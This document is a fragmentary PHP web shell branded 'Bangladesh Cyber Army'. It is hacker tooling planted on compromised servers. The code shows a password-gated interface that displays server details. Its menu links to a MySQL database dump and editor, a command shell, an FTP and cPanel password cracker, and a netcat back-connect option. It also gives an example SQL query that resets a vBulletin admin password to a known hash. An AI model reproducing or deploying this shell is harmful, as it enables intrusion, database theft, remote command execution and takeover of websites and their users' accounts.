...
<BR><BR><div align=center><font color=blue face=tahoma size=5>Bangladesh Cyber Army<BR><img src=http://www.alamuae.com/up/uplong/loading326953187146197.gif></div>');
			exit;
		}

	else
	{
	$err_mess = '<table width=100%><tr><td bgcolor=#000000 width=100% height=70><div align=center><font color=blue face=tahoma size=5><blink>"PaSsw0rd eRr0r"</blink><BR></font></div></td></tr></table>';
echo $err_mess;
	}}
	if ($_COOKIE['vbapass']) {
...
<title><?php echo str_replace('.','','Bangladesh Cyber Army');?></title>
<style type="text/css">
body,td{font: 10pt comic sans ms;color:#blue;line-height: 16px;}

a {color: blue;text-decoration:none;}
a:hover{color: #f00;text-decoration:underline;}
.alt1 td{border-top:1px solid gray;border-bottom:1px solid gray;background:white;padding:5px 10px 5px 5px;}
.alt2 td{border-top:1px solid gray;border-bottom:1px solid gray;background:white;padding:5px 10px 5px 5px;}
.focus td{border-top:1px solid gray;border-bottom:0px solid gray;background:#111111;padding:5px 10px 5px 5px;}
.fout1 td{border-top:1px solid gray;border-bottom:0px solid gray;background:white;padding:5px 10px 5px 5px;}
.fout td{border-top:1px solid gray;border-bottom:0px solid gray;background:white;padding:5px 10px 5px 5px;}
.head td{border-top:1px solid gray;border-bottom:1px solid gray;background:white;padding:5px 10px 5px 5px;font-weight:bold;}
.head_small td{border-top:1px solid gray;border-bottom:1px solid gray;background:white;padding:5px 10px 5px 5px;font-weight:normal;font-size:8pt;}
...
<body onLoad="init()" style="margin:0;table-layout:fixed; word-break:break-all" bgcolor=white background=http://www.club-h.co.cc/photo.jpg>
...
<div border="0" style="position:fixed; width: 100%; height: 25px; z-index: 1; top: 300px; left: 0;" id="loading" align="center" valign="center">
 ...
 var ie4=document.all;
  if (ns4)
 	...
 	ld=document.getElementById("Wait Please For BCA Shell loading").style;
 else if (ie4)
...
<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tr class="head_small">
		<td  width=100%>
		<table width=100%><tr class="head_small"><td  width=86px><a title="Bangladesh Cyber Army" href="<?php $self;?>"><img src="http://a5.sphotos.ak.fbcdn.net/hphotos-ak-ash4/430371_349288848444601_188199284553559_1018971_508910386_n.jpg" height=180 border=0></a></td><td>
		<div style="font-size:40px;font-weight:bold;font-style:normal;color:#468100;text-decoration:none;text-shadow:#09fd02 3px 3px  3px;font-variant:small-caps;">BANGLADESH <span style="color:RED"> CYBER </span> ARMY</div><br>
		<span style="float:left;"> <?php echo "HosT Server: ".$_SERVER['HTTP_HOST']."";?>  | <a href="http://Facebook.com/BDcyberarmy" target="_blank"><?php echo str_replace('.','','Bangladesh Cyber Army');?> </a> | <a href="javascript:goaction('logout');"><font color=red>Log0ut</font></a></span> <br />
...
echo (($safe_mode)?("Safe Mod: <b><font color=red>ON</font></b> - "):("Safe m0de: <b><font color=green>OFF</font></b>  -"));
...
echo "<font color=black>uname -a</font>: ".@substr(@php_uname(),0,120)."<br>";
echo "<font color=black>Server</font>: ".@substr($SERVER_SOFTWARE,0,120)." - <font color=white>id</font>: ".@getmyuid()."(".@get_current_user().") - uid=".@getmyuid()." (".@get_current_user().") gid=".@getmygid()."(".@get_current_user().")<br>";
	...
	<tr class="alt1">
		<td  width=10%><span style="float:left;">My IP: <?php echo "<font color=red>".$_SERVER['REMOTE_ADDR']."</font>";?> </span>   <br />
<br />

                        <a href="javascript:goaction('file');">Current</a> |
			<a href="javascript:goaction('sqladmin');">DUMP MySqL DB </a> |
			<a href="javascript:goaction('sqlfile');">MySql Edit0r</a> |
			<a href="javascript:goaction('shell');">Cmd/Bash</a> 
			<?php if (!IS_WIN) {?> | <a href="javascript:goaction('brute');">Crack Ftp & Cpanel</a> <?php }?>
			<?php if (!IS_WIN) {?> | <a href="javascript:goaction('backconnect');">NC Connect</a><?php }?>
...
<?php
	...
	if (isset($dbhost) && isset($dbuser) && isset($dbpass) && isset($connect)) {
		...
		if ($dbname) {
			...
			p('<p><table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td colspan="2">Run SQL query/queries on database <font color=red><b>'.$dbname.'</font></b>:<BR>Example VBB Password: <font color=red>Bca</font><BR><font color=yellow>UPDATE `user` SET `password` = \'69e53e5ab9536e55d31ff533aefc4fbe\', salt = \'p5T\' WHERE `userid` = \'1\' </font>
...
<b> Target  : </font><input type='text' name='target' size='16' value= $target style='border: font-family:comic sans ms; font-weight:bold;'></p></font></b></p>
<div align='center'><br>
